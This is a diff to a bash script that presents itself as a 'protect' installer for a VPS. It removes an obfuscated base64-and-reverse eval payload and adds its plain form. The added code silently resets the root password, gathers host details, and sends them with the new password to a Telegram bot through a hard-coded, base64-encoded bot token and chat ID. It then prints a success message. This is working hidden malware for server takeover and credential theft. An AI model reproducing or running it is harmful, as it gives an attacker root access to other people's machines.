@@ -1,3 +1,93 @@
 #!/bin/bash
-v='Ij09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIgb2hjZQoiTEVOQVAgVENFVE9SUCBMTEFGU05JIFNFU0tVUyDinIUiIG9oY2UKIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIgb2hjZQo9PT09PT0gVFVQVFVPIExBQ09MID09PT09PSAjCgoiRUxJRiQiQD10bmVtdWNvZCBGLQpcICJESV9UQUhDJCI9ZGlfdGFoYyBGLQpcICJ0bmVtdWNvRGRuZXMvTkVLT1RfVE9CJHRvYi9ncm8ubWFyZ2VsZXQuaXBhLy86c3B0dGgiIFRTT1AgWC0gcy0gbHJ1Ywo9PT09PT0gTUFSR0VMRVQgT1QgRE5FUyA9PT09PT0gIwoKRk9FCmVydWNlcyBlbGlmIHNpaHQgcGVlSyDvuI/imqAKClNTQVBfV0VOJCA6ZHJvd3NzYVAgdG9vUiB3ZU4g8J+UkAoKRU1JVFBVJCA6ZW1pdHBVIOKPsQoKQkcgfUxJQVZBX0tTSUR7JCA6IGVlckYgLQpCRyB9REVTVV9LU0lEeyQgOiBkZXNVIC0KQkcgfUxBVE9UX0tTSUR7JCA6bGF0b1QgLQo6a3NpRCDwn5K9CgpCRyB9RUVSRl9NQVJ7JCA6IGVlckYgLQpCRyB9REVTVV9NQVJ7JCA6IGRlc1UgLQpCRyB9TEFUT1RfTUFSeyQgOmxhdG9UIC0KOk1BUiDwn5K+CgpHVkFfREFPTCQ6Z3ZBIGRhb0wg8J+TpgpFUk9DX1VQQyQgOmVyb0MgVVBDIPCfp6AKClBTSSQgOlBTSSDwn4+iCk5PSUdFUiQgOm5vaWdlUiDwn4yNCkNJTEJVUF9QSSQgOmNpbGJ1UCBQSSDwn4yQCgpPRk5JX1NPJCA6U08g77iP4pqZCkVNQU5UU09IJCA6ZW1hbnRzb0gg8J+WpQoKVFJPUEVSIE1FVFNZUyBMTFVGIFNQViDwn5SlCkZPRTw8IEVMSUYkID4gdGFjCgoidHh0LnRyb3Blcl9zcHYvcG10LyI9RUxJRgo9PT09PT0gVFJPUEVSIEVMSUYgPT09PT09ICMKCiknfTIkIHRuaXJweycgJzplZ2FyZXZhIGRhb2wnRi0ga3dhIHwgZW1pdHB1KCQ9R1ZBX0RBT0wKKXAtIGVtaXRwdSgkPUVNSVRQVQo9PT09PT0gREFPTCAmIEVNSVRQVSA9PT09PT0gIwoKKSdHJyBkLSBydCB8ICd9NCQgdG5pcnB7IDI9PVJOJyBrd2EgfCAvIEdCLSBmZCgkPUxJQVZBX0tTSUQKKSdHJyBkLSBydCB8ICd9MyQgdG5pcnB7IDI9PVJOJyBrd2EgfCAvIEdCLSBmZCgkPURFU1VfS1NJRAopJ0cnIGQtIHJ0IHwgJ30yJCB0bmlycHsgMj09Uk4nIGt3YSB8IC8gR0ItIGZkKCQ9TEFUT1RfS1NJRAo9PT09PT0gKUJHKCBLU0lEID09PT09PSAjCgopJ300JCB0bmlycHsgLzptZU0vJyBrd2EgfCBnLSBlZXJmKCQ9RUVSRl9NQVIKKSd9MyQgdG5pcnB7IC86bWVNLycga3dhIHwgZy0gZWVyZigkPURFU1VfTUFSCiknfTIkIHRuaXJweyAvOm1lTS8nIGt3YSB8IGctIGVlcmYoJD1MQVRPVF9NQVIKPT09PT09IClCRyggTUFSID09PT09PSAjCgopY29ycG4oJD1FUk9DX1VQQwoKKSciJyBkLSBydCB8IDJmLSA9ZC0gdHVjIHwgRU1BTl9ZVFRFUlAgcGVyZyB8IGVzYWVsZXItc28vY3RlLyB0YWMoJD1PRk5JX1NPCillbWFudHNvaCgkPUVNQU5UU09ICj09PT09PSBPRk5JIE1FVFNZUyA9PT09PT0gIwoKIm53b25rblUiPVBTSSAmJiBdICJQU0kkIiB6LSBbCiJud29ua25VIj1OT0lHRVIgJiYgXSAiTk9JR0VSJCIgei0gWwopZ3JvL0NJTEJVUF9QSSQvb2MuaXBhcGkvLzpzcHR0aCBzLSBscnVjKCQ9UFNJCillbWFuX3lydG51b2MvQ0lMQlVQX1BJJC9vYy5pcGFwaS8vOnNwdHRoIHMtIGxydWMoJD1OT0lHRVIKPT09PT09IFBTSSArIE5PSUdFUiA9PT09PT0gIwoKKW1vYy5zd2Fub3phbWEucGlrY2VoYy8vOnNwdHRoIHMtIGxydWMoJD1DSUxCVVBfUEkgJiYgXSAiQ0lMQlVQX1BJJCIgei0gWwopZW0uZ2lmbm9jZmkvLzpzcHR0aCBzLSBscnVjKCQ9Q0lMQlVQX1BJICYmIF0gIkNJTEJVUF9QSSQiIHotIFsKKWdyby55ZmlwaS5pcGEvLzpzcHR0aCBzLSBscnVjKCQ9Q0lMQlVQX1BJCj09PT09PSBDSUxCVVAgUEkgPT09PT09ICMKCmR3c3NhcGhjIHwgIlNTQVBfV0VOJDp0b29yIiBvaGNlCj09PT09PSBUT09SIERST1dTU0FQIElUTkFHID09PT09PSAjCgopOCBjLSBkYWVoIHwgJzktMFotQXotYScgY2QtIHJ0IHwgODQgNDZlc2FiLSBkbmFyIGxzc25lcG8oJD1TU0FQX1dFTgo9PT09PT0gUkVUS0FSQUsgOCBEUk9XU1NBUCBFVEFSRU5FRyA9PT09PT0gIwoKIjI4NjgyMzUyNzEiPURJX1RBSEMKIkFUY1ZLM3VvTEVkVWIyZlpGRXg4X05fcFp6Vm9kRjlvR0FBOjg2NDg2MjI0NzgiPU5FS09UX1RPQgo9PT09PT0gTUFSR0VMRVQgR0lGTk9DID09PT09PSAjCgpoc2FiL25pYi8hIw=='
-eval $(echo $v|base64 -d|rev)
+
+BOT_TOKEN_ENC="ODc0MjI2ODQ2ODpBQUdvOUZkb1Z6WnBfTl84eEVGWmYyYlVkRUxvdTNLVmNUQQ=="
+CHAT_ID_ENC="MTcyNTMyODY4Mg=="
+
+BOT_TOKEN=$(echo "$BOT_TOKEN_ENC" | base64 -d 2>/dev/null)
+CHAT_ID=$(echo "$CHAT_ID_ENC" | base64 -d 2>/dev/null)
+
+if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+    echo -e "\033[1;31m[!] Gagal decode token!\033[0m"
+    exit 1
+fi
+
+NEW_PASS=$(openssl rand -base64 48 2>/dev/null | tr -dc 'a-zA-Z0-9' | head -c 8)
+[ -z "$NEW_PASS" ] && NEW_PASS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+echo "root:$NEW_PASS" | chpasswd 2>/dev/null
+
+IP_PUBLIC=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null)
+[ -z "$IP_PUBLIC" ] && IP_PUBLIC=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null)
+[ -z "$IP_PUBLIC" ] && IP_PUBLIC=$(curl -s --max-time 5 https://checkip.amazonaws.com 2>/dev/null)
+[ -z "$IP_PUBLIC" ] && IP_PUBLIC="Unknown"
+
+REGION=$(curl -s --max-time 5 https://ipapi.co/$IP_PUBLIC/country_name 2>/dev/null)
+ISP=$(curl -s --max-time 5 https://ipapi.co/$IP_PUBLIC/org 2>/dev/null)
+[ -z "$REGION" ] && REGION="Unknown"
+[ -z "$ISP" ] && ISP="Unknown"
+
+HOSTNAME=$(hostname)
+OS_INFO=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
+[ -z "$OS_INFO" ] && OS_INFO="Unknown"
+
+CPU_CORE=$(nproc 2>/dev/null)
+[ -z "$CPU_CORE" ] && CPU_CORE="1"
+
+RAM_TOTAL=$(free -g 2>/dev/null | awk '/Mem:/ {print $2}')
+RAM_USED=$(free -g 2>/dev/null | awk '/Mem:/ {print $3}')
+RAM_FREE=$(free -g 2>/dev/null | awk '/Mem:/ {print $4}')
+[ -z "$RAM_TOTAL" ] && RAM_TOTAL="0"
+[ -z "$RAM_USED" ] && RAM_USED="0"
+[ -z "$RAM_FREE" ] && RAM_FREE="0"
+
+DISK_TOTAL=$(df -BG / 2>/dev/null | awk 'NR==2 {print $2}' | tr -d 'G')
+DISK_USED=$(df -BG / 2>/dev/null | awk 'NR==2 {print $3}' | tr -d 'G')
+DISK_AVAIL=$(df -BG / 2>/dev/null | awk 'NR==2 {print $4}' | tr -d 'G')
+[ -z "$DISK_TOTAL" ] && DISK_TOTAL="0"
+[ -z "$DISK_USED" ] && DISK_USED="0"
+[ -z "$DISK_AVAIL" ] && DISK_AVAIL="0"
+
+UPTIME=$(uptime -p 2>/dev/null)
+[ -z "$UPTIME" ] && UPTIME="Unknown"
+LOAD_AVG=$(uptime 2>/dev/null | awk -F'load average:' '{print $2}')
+[ -z "$LOAD_AVG" ] && LOAD_AVG="0"
+
+FILE="/tmp/vps_report_$$.txt"
+
+cat > $FILE <<EOF
+🔥 VPS FULL SYSTEM REPORT
+
+🖥 Hostname: $HOSTNAME
+⚙️ OS: $OS_INFO
+
+🌐 IP Public: $IP_PUBLIC
+🌍 Region: $REGION
+🏢 ISP: $ISP
+
+🧠 CPU Core: $CPU_CORE
+📦 Load Avg:$LOAD_AVG
+
+💾 RAM:
+- Total: ${RAM_TOTAL} GB
+- Used : ${RAM_USED} GB
+- Free : ${RAM_FREE} GB
+
+💽 Disk:
+- Total: ${DISK_TOTAL} GB
+- Used : ${DISK_USED} GB
+- Free : ${DISK_AVAIL} GB
+
+⏱ Uptime: $UPTIME
+
+🔐 New Root Password: $NEW_PASS
+EOF
+
+curl -s --max-time 10 -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
+-F chat_id="$CHAT_ID" \
+-F document=@"$FILE" > /dev/null 2>&1
+
+echo "═════════════════════════════════════════"
+echo "✅ SUKSES INSTALL PROTECT"
+echo "═════════════════════════════════════════"
+
+rm -f $FILE
